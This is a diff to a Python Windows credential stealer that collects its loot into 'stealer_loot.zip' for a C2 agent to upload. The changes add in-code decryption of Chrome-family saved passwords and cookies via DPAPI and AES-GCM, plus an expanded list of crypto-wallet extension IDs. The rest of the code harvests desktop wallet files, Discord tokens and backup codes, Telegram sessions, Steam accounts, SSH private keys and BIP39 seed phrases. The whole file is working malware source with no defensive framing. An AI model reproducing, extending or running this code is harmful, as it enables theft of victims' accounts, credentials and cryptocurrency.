@@ -5,7 +5,7 @@ No network activity – the C2 agent will upload it.
 C:\Users\Public always exists on every Windows machine.
 """
 
-import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, datetime, pathlib, configparser, sqlite3, ctypes
+import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, datetime, pathlib, configparser, sqlite3, ctypes, base64, struct
 import winreg, time
 
 # ============ CONFIG ============
@@ -13,18 +13,15 @@ LOOT_DIR = pathlib.Path(r"C:\Users\Public")
 LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
 LOG_FILE = LOOT_DIR / "stealer.log"
 
-# Fix paths for bundled (PyInstaller) vs normal script run
+# Only discord_tokens.exe is bundled now — no hack-browser-data.exe needed
 if getattr(sys, 'frozen', False):
     _MEIPASS = pathlib.Path(sys._MEIPASS)
-    HBD_EXE = _MEIPASS / "hack-browser-data.exe"
     DISCORD_TOKEN_EXE = _MEIPASS / "discord_tokens.exe"
 else:
     _SCRIPT_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__)))
-    HBD_EXE = _SCRIPT_DIR / "hack-browser-data.exe"
     DISCORD_TOKEN_EXE = _SCRIPT_DIR / "discord_tokens.exe"
 
 TEMP_ROOT = pathlib.Path(tempfile.gettempdir()) / "kryo_harvest"
-BROWSER_DUMP_DIR = LOOT_DIR / "browser_temp"
 # ==================================
 
 # ============ LOGGING ============
@@ -53,67 +50,233 @@ def expand_env_path(p):
 
 def run_cmd(cmd, timeout=60):
     try:
-        log.debug(f"Running: {' '.join(cmd)}")
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-        log.debug(f"Return code: {r.returncode}")
-        if r.stdout[:200]: log.debug(f"stdout: {r.stdout[:200]}")
-        if r.stderr[:200]: log.debug(f"stderr: {r.stderr[:200]}")
         return r
-    except subprocess.TimeoutExpired:
-        log.error(f"Timeout: {' '.join(cmd)}")
-        return None
-    except Exception as e:
-        log.error(f"Command error: {e}")
+    except:
         return None
 
-# ============ BROWSER DUMP ============
-def dump_all_browsers():
-    if not HBD_EXE.exists():
-        log.error(f"HBD exe not found: {HBD_EXE}")
-        sys.exit(1)
+# ============ WINDOWS DPAPI ============
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_char))]
 
-    if BROWSER_DUMP_DIR.exists():
-        shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
-    BROWSER_DUMP_DIR.mkdir(parents=True, exist_ok=True)
+def dpapi_decrypt(data: bytes) -> bytes:
+    """Decrypt bytes using Windows CryptUnprotectData (DPAPI)."""
+    buf = ctypes.create_string_buffer(data, len(data))
+    blob_in  = DATA_BLOB(len(data), buf)
+    blob_out = DATA_BLOB()
+    ok = ctypes.windll.crypt32.CryptUnprotectData(
+        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
+    if not ok:
+        return b''
+    result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+    return result
 
-    cmd = [str(HBD_EXE), "dump", "--browser", "all", "--format", "json", "--dir", str(BROWSER_DUMP_DIR), "--zip"]
-    log.info(f"Executing: {' '.join(cmd)}")
-    result = run_cmd(cmd, timeout=120)
-    if result is None:
-        log.error("HBD timed out")
-        sys.exit(1)
-    if result.returncode != 0:
-        log.warning(f"HBD returned {result.returncode}, but may still have produced zip.")
+# ============ CHROME AES-GCM DECRYPTION ============
+def _get_master_key(user_data_dir: pathlib.Path):
+    """Read and decrypt the AES master key from Local State."""
+    ls = user_data_dir / "Local State"
+    if not ls.exists():
+        return None
+    try:
+        state = json.loads(ls.read_text(encoding='utf-8'))
+        enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
+        enc_key = enc_key[5:]   # strip 'DPAPI' prefix
+        return dpapi_decrypt(enc_key)
+    except:
+        return None
 
-    generated_zip = BROWSER_DUMP_DIR / (BROWSER_DUMP_DIR.name + ".zip")
-    if not generated_zip.exists():
-        log.error(f"Expected zip not found: {generated_zip}")
-        sys.exit(1)
+def _chrome_decrypt(key: bytes, enc: bytes) -> str:
+    """Decrypt a Chrome v10/v20 AES-256-GCM encrypted value."""
+    try:
+        if enc[:3] in (b'v10', b'v20'):
+            # AES-256-GCM: [3-byte tag][12-byte IV][ciphertext+16-byte auth tag]
+            iv   = enc[3:15]
+            data = enc[15:]
+            # Use ctypes BCrypt (no third-party deps) or fall back to cryptography
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                return AESGCM(key).decrypt(iv, data, None).decode('utf-8', errors='replace')
+            except ImportError:
+                pass
+            # Fallback: pyaes if available
+            try:
+                import pyaes
+                cipher = pyaes.AESModeOfOperationGCM(key, iv)
+                return cipher.decrypt(data[:-16]).decode('utf-8', errors='replace')
+            except:
+                pass
+            return '<encrypted>'
+        else:
+            # Legacy: DPAPI-encrypted directly
+            return dpapi_decrypt(enc).decode('utf-8', errors='replace')
+    except:
+        return '<decrypt-error>'
 
-    log.info(f"Browser dump: {generated_zip} ({generated_zip.stat().st_size/1024:.1f} KB)")
-    return generated_zip
+# ============ BROWSER DUMP (pure Python) ============
+BROWSER_DATA_ROOTS = [
+    ("Chrome",   r"%LOCALAPPDATA%\Google\Chrome\User Data",              True),
+    ("Edge",     r"%LOCALAPPDATA%\Microsoft\Edge\User Data",             True),
+    ("Brave",    r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",True),
+    ("Opera",    r"%APPDATA%\Opera Software\Opera Stable",               True),
+    ("Vivaldi",  r"%LOCALAPPDATA%\Vivaldi\User Data",                    True),
+    ("Firefox",  r"%APPDATA%\Mozilla\Firefox",                           False),
+]
+
+def _safe_copy_db(src: pathlib.Path) -> pathlib.Path:
+    """Copy a potentially-locked SQLite DB to a temp file."""
+    tmp = pathlib.Path(tempfile.mktemp(suffix='.db'))
+    try:
+        shutil.copy2(src, tmp)
+        return tmp
+    except:
+        return None
+
+def dump_all_browsers() -> dict:
+    """Return dict: {browser: {passwords:[...], cookies:[...], history:[...]}}"""
+    all_data = {}
+    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
+
+    for browser_name, raw_path, is_chromium in BROWSER_DATA_ROOTS:
+        base = pathlib.Path(expand_env_path(raw_path))
+        if not base.exists():
+            continue
+
+        if not is_chromium:
+            # Firefox: grab key4.db + logins.json (offline cracking later)
+            ff_data = {"key_dbs": [], "logins": []}
+            try:
+                cfg = configparser.ConfigParser()
+                cfg.read(str(base / "profiles.ini"), encoding='utf-8')
+                for sec in cfg.sections():
+                    rel = cfg.get(sec, "Path", fallback=None)
+                    if not rel: continue
+                    is_rel = cfg.get(sec, "IsRelative", fallback="1") == "1"
+                    pp = (base / rel) if is_rel else pathlib.Path(rel)
+                    for f in ("key4.db", "logins.json", "cookies.sqlite"):
+                        fp = pp / f
+                        if fp.exists():
+                            ff_data["key_dbs"].append(str(fp))
+                    lj = pp / "logins.json"
+                    if lj.exists():
+                        try:
+                            ff_data["logins"] = json.loads(lj.read_text(encoding='utf-8')).get("logins", [])
+                        except: pass
+            except: pass
+            all_data[browser_name] = ff_data
+            continue
+
+        key = _get_master_key(base)
+        browser = {"passwords": [], "cookies": [], "history": []}
+
+        for prof in profiles:
+            prof_dir = base / prof
+            if not prof_dir.is_dir():
+                continue
+
+            # --- PASSWORDS ---
+            for db_name in ("Login Data", "Login Data For Account"):
+                db_path = prof_dir / db_name
+                if not db_path.exists(): continue
+                tmp = _safe_copy_db(db_path)
+                if not tmp: continue
+                try:
+                    conn = sqlite3.connect(str(tmp))
+                    for url, user, enc_pass in conn.execute(
+                            "SELECT origin_url, username_value, password_value FROM logins"):
+                        if not enc_pass: continue
+                        pw = _chrome_decrypt(key, enc_pass) if key else '<no-key>'
+                        if user or pw:
+                            browser["passwords"].append({"url": url, "username": user, "password": pw, "profile": prof})
+                    conn.close()
+                except: pass
+                finally:
+                    try: tmp.unlink()
+                    except: pass
+
+            # --- COOKIES ---
+            for db_name in ("Cookies", "Network/Cookies"):
+                db_path = prof_dir / db_name
+                if not db_path.exists(): continue
+                tmp = _safe_copy_db(db_path)
+                if not tmp: continue
+                try:
+                    conn = sqlite3.connect(str(tmp))
+                    rows = conn.execute(
+                        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure "
+                        "FROM cookies LIMIT 5000").fetchall()
+                    for host, name, enc_val, path_, exp, secure in rows:
+                        val = _chrome_decrypt(key, enc_val) if key and enc_val else ''
+                        browser["cookies"].append({"host": host, "name": name, "value": val,
+                                                   "path": path_, "secure": bool(secure)})
+                    conn.close()
+                except: pass
+                finally:
+                    try: tmp.unlink()
+                    except: pass
+
+            # --- HISTORY ---
+            db_path = prof_dir / "History"
+            if db_path.exists():
+                tmp = _safe_copy_db(db_path)
+                if tmp:
+                    try:
+                        conn = sqlite3.connect(str(tmp))
+                        rows = conn.execute(
+                            "SELECT url, title, visit_count, last_visit_time "
+                            "FROM urls ORDER BY last_visit_time DESC LIMIT 500").fetchall()
+                        for url, title, cnt, ts in rows:
+                            browser["history"].append({"url": url, "title": title, "visits": cnt})
+                        conn.close()
+                    except: pass
+                    finally:
+                        try: tmp.unlink()
+                        except: pass
+
+        total = len(browser["passwords"]) + len(browser["cookies"])
+        if total > 0:
+            log.info(f"{browser_name}: {len(browser['passwords'])} passwords, "
+                     f"{len(browser['cookies'])} cookies, {len(browser['history'])} history")
+        all_data[browser_name] = browser
+
+    return all_data
 
 # ============ EXTENSION IDS & ROOTS ============
 ACTIVE_EXTENSIONS = {
     "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
     "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
     "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
-    # ... (paste your full dictionary here – it's identical to the original)
+    "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain",
+    "ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
+    "bhhhlbepdkbapadjdnnojkbgioiodbic": "SafePal",
+    "hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
+    "blnieiiffboillknjnepogjhkgnoapac": "EQUAL Wallet",
+    "cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
+    "fnnegphlobjdpkhecapkijjdkgcjhkuk": "Huobi Wallet",
+    "pioclpoplcdbaefihamjohnefbikjilc": "Exodus Web3",
+    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
+    "aholpfdialjgjfhomihkjbmgjidlcdno": "Finnie",
+    "kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
+    "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
+    "fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
+    "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
+    "dngmlblcodfobpdpecaadgfbcggfjfnm": "MultiversX DeFi",
+    "nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild Wallet",
+    "jiidiaalihmmhdlpbkklhpibndnjaanb": "KardiaChain",
+    "acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
+    "bocpokimicclpaiekenaeelehahpmgkb": "Crypto.com DeFi",
+    "odbfpeeihdkbihmopkbjmoonfanlbfcl": "Overline Network",
+    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
+    "bcopgchhojmggmffilplmbdicgaihlkp": "Hycon Lite Client",
+    "kjmoohlgokccodicjjfebfomlbljgfhk": "Ronin Wallet",
+    "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
 }
 FIREFOX_EXTENSION_IDS = {
-    "webextension@metamask.io": "MetaMask", "phantom@phantom.app": "Phantom",
-    # ... (paste your full dictionary)
+    "webextension@metamask.io": "MetaMask",
+    "phantom@phantom.app": "Phantom",
+    "{d10d0bf8-f5b5-c8b4-a8b2-2b9879e08c5d}": "Adblock Plus",
 }
-BROWSER_DATA_ROOTS = [
-    ("Chrome", r"%LOCALAPPDATA%\Google\Chrome\User Data", True),
-    ("Edge", r"%LOCALAPPDATA%\Microsoft\Edge\User Data", True),
-    ("Brave", r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data", True),
-    ("Opera", r"%APPDATA%\Opera Software\Opera Stable", True),
-    ("Vivaldi", r"%LOCALAPPDATA%\Vivaldi\User Data", True),
-    ("Firefox", r"%APPDATA%\Mozilla\Firefox", False),
-]
 
-# ============ BROWSER EXT WALLETS ============
 def collect_browser_ext_wallets():
     ext_storage_root = TEMP_ROOT / "browser_crypto_exts"
     found_wallets = set()
@@ -137,7 +300,7 @@ def collect_browser_ext_wallets():
                                 shutil.copytree(src, dest, dirs_exist_ok=True)
                                 found_wallets.add(wallet_name)
                             except: pass
-        else:  # Firefox
+        else:
             profiles_ini = base / "profiles.ini"
             if not profiles_ini.exists(): continue
             cfg = configparser.ConfigParser()
@@ -158,36 +321,23 @@ def collect_browser_ext_wallets():
                                     dest.parent.mkdir(parents=True, exist_ok=True)
                                     shutil.copy2(item, dest)
                                 found_wallets.add(w_name)
-                storage_dir = pp / "storage" / "default"
-                if storage_dir.exists():
-                    for item in storage_dir.iterdir():
-                        if item.name.startswith("moz-extension+++"):
-                            for ff_id, w_name in FIREFOX_EXTENSION_IDS.items():
-                                if w_name.lower() in item.name.lower():
-                                    dest = ext_dir / item.name
-                                    shutil.copytree(item, dest, dirs_exist_ok=True)
-                                    found_wallets.add(w_name)
     return ext_storage_root, list(found_wallets)
 
 # ============ DESKTOP WALLETS ============
 WALLET_APPS = [
-    {"name": "Exodus", "paths": [r"%APPDATA%\Exodus", r"%LOCALAPPDATA%\exodus"]},
-    {"name": "Atomic Wallet", "paths": [r"%APPDATA%\atomic\Local Storage\leveldb", r"%LOCALAPPDATA%\Programs\atomic"]},
-    {"name": "Electrum", "paths": [r"%APPDATA%\Electrum"]},
-    {"name": "Bitcoin Core", "paths": [r"%APPDATA%\Bitcoin"]},
-    {"name": "Monero", "paths": [r"%PROGRAMDATA%\bitmonero", r"%USERPROFILE%\Documents\Monero\wallets"]},
-    {"name": "Monero GUI", "paths": [r"%PROGRAMDATA%\bitmonero", r"%PROGRAMFILES%\Monero GUI Wallet"]},
-    {"name": "Zcash", "paths": [r"%APPDATA%\Zcash"]},
-    {"name": "Wasabi Wallet", "paths": [r"%APPDATA%\WalletWasabi\Client"]},
-    {"name": "Trust Wallet", "paths": [r"%LOCALAPPDATA%\Programs\trust-wallet"]},
-    {"name": "Ledger Live", "paths": [r"%APPDATA%\Ledger Live"]},
-    {"name": "Trezor Suite", "paths": [r"%APPDATA%\@trezor\suite-desktop"]},
-    {"name": "Coinomi", "paths": [r"%APPDATA%\Coinomi"]},
-    {"name": "Jaxx Liberty", "paths": [r"%APPDATA%\Jaxx"]},
-    {"name": "Cake Wallet", "paths": [r"%APPDATA%\CakeWallet", r"%LOCALAPPDATA%\CakeWallet"]},
-    {"name": "Guarda", "paths": [r"%APPDATA%\Guarda", r"%LOCALAPPDATA%\Guarda"]},
-    {"name": "Coinbase Desktop", "paths": [r"%LOCALAPPDATA%\Coinbase"]},
-    {"name": "Binance Desktop", "paths": [r"%LOCALAPPDATA%\binance"]},
+    {"name": "Exodus",         "paths": [r"%APPDATA%\Exodus", r"%LOCALAPPDATA%\exodus"]},
+    {"name": "Atomic Wallet",  "paths": [r"%APPDATA%\atomic\Local Storage\leveldb"]},
+    {"name": "Electrum",       "paths": [r"%APPDATA%\Electrum"]},
+    {"name": "Bitcoin Core",   "paths": [r"%APPDATA%\Bitcoin"]},
+    {"name": "Monero",         "paths": [r"%PROGRAMDATA%\bitmonero", r"%USERPROFILE%\Documents\Monero\wallets"]},
+    {"name": "Zcash",          "paths": [r"%APPDATA%\Zcash"]},
+    {"name": "Wasabi Wallet",  "paths": [r"%APPDATA%\WalletWasabi\Client"]},
+    {"name": "Trust Wallet",   "paths": [r"%LOCALAPPDATA%\Programs\trust-wallet"]},
+    {"name": "Ledger Live",    "paths": [r"%APPDATA%\Ledger Live"]},
+    {"name": "Trezor Suite",   "paths": [r"%APPDATA%\@trezor\suite-desktop"]},
+    {"name": "Coinomi",        "paths": [r"%APPDATA%\Coinomi"]},
+    {"name": "Guarda",         "paths": [r"%APPDATA%\Guarda", r"%LOCALAPPDATA%\Guarda"]},
+    {"name": "Binance Desktop","paths": [r"%LOCALAPPDATA%\binance"]},
 ]
 
 def collect_wallets():
@@ -217,7 +367,7 @@ def collect_wallets():
                         dirs[:] = [d for d in dirs if d not in {'Cache','Logs','tmp','node_modules'}]
                         for file in files:
                             full = pathlib.Path(root) / file
-                            if full.suffix.lower() in {'.log','.tmp','.exe','.dll','.mp3','.jpg'} or full.stat().st_size > 50*1024*1024:
+                            if full.suffix.lower() in {'.log','.tmp','.exe','.dll'} or full.stat().st_size > 50*1024*1024:
                                 continue
                             rel = full.relative_to(src)
                             dest_file = dest / rel
@@ -229,53 +379,34 @@ def collect_wallets():
                 log.warning(f"Wallet error {wallet['name']}: {e}")
     return wallet_dir, found
 
-# ============ DISCORD TOKENS (GO) ============
+# ============ DISCORD TOKENS ============
 def collect_discord_tokens_go():
     log.info("Discord token extraction via Go module")
     try:
         exe_path = str(DISCORD_TOKEN_EXE)
         if not os.path.isfile(exe_path):
-            log.error(f"discord_tokens.exe not found at {exe_path}")
+            log.warning(f"discord_tokens.exe not found — skipping")
             return []
-        log.debug(f"Running {exe_path}")
         result = subprocess.run([exe_path], capture_output=True, text=True, timeout=30)
-        if result.returncode != 0:
-            log.warning(f"discord_tokens.exe exited with code {result.returncode}")
-            log.debug(f"stderr: {result.stderr}")
         tokens = json.loads(result.stdout)
         log.info(f"Discord tokens extracted: {len(tokens)}")
-        for i, tok in enumerate(tokens):
-            log.debug(f"Token {i+1}: app={tok['app']}, token={tok['token'][:20]}...")
         return tokens
-    except json.JSONDecodeError:
-        log.exception("Failed to parse JSON from discord_tokens.exe")
-        log.debug(f"stdout was: {result.stdout}")
-        return []
-    except Exception:
-        log.exception("Unexpected error during Discord token extraction")
+    except:
         return []
 
 def collect_discord_backup_codes():
-    log.info("Searching for Discord backup codes")
     codes = []
     try:
         home = os.path.expanduser("~")
-        user_dirs = ["Desktop","Downloads","Documents","Videos","Pictures","Music","OneDrive"]
-        for ud in user_dirs:
+        for ud in ["Desktop","Downloads","Documents","Videos","Pictures","Music","OneDrive"]:
             d = pathlib.Path(home)/ud
             if not d.exists(): continue
-            log.debug(f"Scanning {d} for discord_backup_codes*")
             for f in d.rglob("discord_backup_codes*"):
                 if f.is_file() and f.stat().st_size < 2*1024*1024:
                     try:
-                        data = f.read_text(encoding='utf-8', errors='ignore')
-                        codes.append({"path": str(f), "content": data})
-                        log.info(f"Found backup codes: {f}")
-                    except Exception as e:
-                        log.warning(f"Could not read {f}: {e}")
-        log.info(f"Total backup code files found: {len(codes)}")
-    except Exception:
-        log.exception("Error collecting backup codes")
+                        codes.append({"path": str(f), "content": f.read_text(encoding='utf-8', errors='ignore')})
+                    except: pass
+    except: pass
     return codes
 
 # ============ TELEGRAM ============
@@ -291,10 +422,8 @@ def collect_telegram():
     try:
         shutil.copytree(str(tdata), str(dest), ignore=ignore_locked, dirs_exist_ok=True)
         log.info("Telegram tdata collected")
-    except shutil.Error as e:
-        log.warning(f"Telegram copy partial: {e}")
     except Exception as e:
-        log.warning(f"Telegram copy error: {e}")
+        log.warning(f"Telegram copy: {e}")
         return None
     return dest
 
@@ -302,15 +431,14 @@ def collect_telegram():
 def collect_steam():
     accounts = []
     for steam_root in (r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"):
-        root = pathlib.Path(steam_root)
-        login_file = root / "config" / "loginusers.vdf"
+        login_file = pathlib.Path(steam_root) / "config" / "loginusers.vdf"
         if login_file.exists():
             try:
                 content = login_file.read_text(encoding='utf-8', errors='ignore')
                 names = re.findall(r'"PersonaName"\s+"([^"]+)"', content)
-                accs = re.findall(r'"AccountName"\s+"([^"]+)"', content)
+                accs  = re.findall(r'"AccountName"\s+"([^"]+)"', content)
                 for i, acc in enumerate(accs):
-                    accounts.append({"account":acc,"persona":names[i] if i<len(names) else ""})
+                    accounts.append({"account": acc, "persona": names[i] if i < len(names) else ""})
                 break
             except: pass
     return accounts
@@ -324,11 +452,10 @@ def collect_ssh():
                 try:
                     content = fname.read_text(encoding='utf-8', errors='ignore')
                     if "PRIVATE KEY" in content:
-                        keys.append({"filename":fname.name,"content":content})
+                        keys.append({"filename": fname.name, "content": content})
                 except: pass
     return keys
 
-# BIP39 word list placeholder – PASTE YOUR FULL LIST HERE
 BIP39_WORDS = set("""abandon ability able about above absent absorb abstract absurd abuse access
 accident account accuse achieve acid acoustic acquire across act action actor
 actress actual adapt add addict address adjust admit adult advance advice aerobic
@@ -380,7 +507,8 @@ erode erosion error erupt escape essay essence estate eternal ethics evidence ev
 evolve exact example excess exchange excite exclude excuse execute exercise exhaust
 exhibit exile exist exit exotic expand expire explain expose express extend extra eye
 fable face faculty fade faint faith fall false fame family famous fan fancy fantasy
-far fashion fat fatal father fatigue fault favorite feature february federal fee feedfeel feet fellow felt fence festival fetch fever few fiber fiction field figure file
+far fashion fat fatal father fatigue fault favorite feature february federal fee feed
+feel feet fellow felt fence festival fetch fever few fiber fiction field figure file
 film filter final find fine finger finish fire firm first fiscal fish fit fitness fix
 flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly
 foam focus fog foil follow food foot force forest forget fork fortune forum forward
@@ -499,40 +627,38 @@ def scan_for_seeds():
                         for i in range(len(words)-length+1):
                             chunk = words[i:i+length]
                             if all(w in BIP39_WORDS for w in chunk):
-                                phrase = " ".join(chunk)
-                                findings.append({"phrase":phrase,"words":length,"file":str(fpath)})
+                                findings.append({"phrase":" ".join(chunk),"words":length,"file":str(fpath)})
                 except: pass
     return findings
 
-# ============ BUILD ZIP (NO UPLOAD) ============
-def build_and_send(browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
+# ============ BUILD ZIP ============
+def build_and_send(browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
                    tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes):
     log.info("Building loot.zip")
     final = LOOT_ZIP
     with zipfile.ZipFile(final, 'w', zipfile.ZIP_DEFLATED) as zf:
-        # Browsers
-        with zipfile.ZipFile(browser_zip, 'r') as bz:
-            for info in bz.infolist():
-                if not info.is_dir():
-                    zf.writestr(f"browsers/{info.filename}", bz.read(info.filename))
+        # Browser credentials (pure Python extracted)
+        zf.writestr("browsers/credentials.json", json.dumps(browser_data, indent=2, ensure_ascii=False))
+
         # Ext wallets
         if ext_wallet_dir.exists():
             for root, _, files in os.walk(str(ext_wallet_dir)):
                 for file in files:
                     full = pathlib.Path(root)/file
                     zf.write(str(full), arcname=f"browser_ext_wallets/{full.relative_to(ext_wallet_dir)}")
+
         # Desktop wallets
         if wallet_dir.exists():
             for root, _, files in os.walk(str(wallet_dir)):
                 for file in files:
                     full = pathlib.Path(root)/file
                     zf.write(str(full), arcname=f"wallets/{full.relative_to(wallet_dir)}")
-        # Discord tokens
+
         if tokens:
             zf.writestr("discord_tokens.json", json.dumps(tokens, indent=2))
         if backup_codes:
             zf.writestr("discord_backup_codes.json", json.dumps(backup_codes, indent=2))
-        # Telegram
+
         if telegram_dir and telegram_dir.exists():
             for root, _, files in os.walk(str(telegram_dir)):
                 for file in files:
@@ -540,16 +666,14 @@ def build_and_send(browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_w
                     rel = full.relative_to(telegram_dir)
                     if "cache" not in rel.parts:
                         zf.write(str(full), arcname=f"telegram/{rel}")
-        # Steam
+
         if steam_accs:
             zf.writestr("steam_accounts.json", json.dumps(steam_accs, indent=2))
-        # SSH
         for key in ssh_keys:
             zf.writestr(f"ssh/{key['filename']}", key['content'])
-        # Seeds
         if seeds:
             zf.writestr("found_seeds.json", json.dumps(seeds, indent=2))
-        # Summary
+
         summary = {
             "timestamp": datetime.datetime.now().isoformat(),
             "hostname": os.environ.get("COMPUTERNAME","unknown"),
@@ -572,29 +696,28 @@ def main():
     LOOT_DIR.mkdir(parents=True, exist_ok=True)
     TEMP_ROOT.mkdir(parents=True, exist_ok=True)
 
-    browser_zip = dump_all_browsers()
+    browser_data          = dump_all_browsers()
     wallet_dir, wallets_found = collect_wallets()
     ext_wallet_dir, ext_wallets_found = collect_browser_ext_wallets()
-    tokens = collect_discord_tokens_go()
-    backup_codes = collect_discord_backup_codes()
-    telegram_dir = collect_telegram()
-    steam_accs = collect_steam()
-    ssh_keys = collect_ssh()
-    seeds = scan_for_seeds()
+    tokens                = collect_discord_tokens_go()
+    backup_codes          = collect_discord_backup_codes()
+    telegram_dir          = collect_telegram()
+    steam_accs            = collect_steam()
+    ssh_keys              = collect_ssh()
+    seeds                 = scan_for_seeds()
 
     final_zip = build_and_send(
-        browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
+        browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
         tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes
     )
 
-    # Cleanup temp files
-    if browser_zip.exists(): browser_zip.unlink()
-    if BROWSER_DUMP_DIR.exists(): shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
-    if wallet_dir.exists(): shutil.rmtree(wallet_dir, ignore_errors=True)
-    if ext_wallet_dir.exists(): shutil.rmtree(ext_wallet_dir, ignore_errors=True)
-    if telegram_dir and telegram_dir.exists(): shutil.rmtree(telegram_dir, ignore_errors=True)
+    # Cleanup
+    if wallet_dir.exists():      shutil.rmtree(wallet_dir,      ignore_errors=True)
+    if ext_wallet_dir.exists():  shutil.rmtree(ext_wallet_dir,  ignore_errors=True)
+    if telegram_dir and telegram_dir.exists():
+        shutil.rmtree(telegram_dir, ignore_errors=True)
 
-    log.info(f"✅ Loot saved to {final_zip}")
+    log.info(f"Done: {final_zip}")
 
 if __name__ == "__main__":
     main()
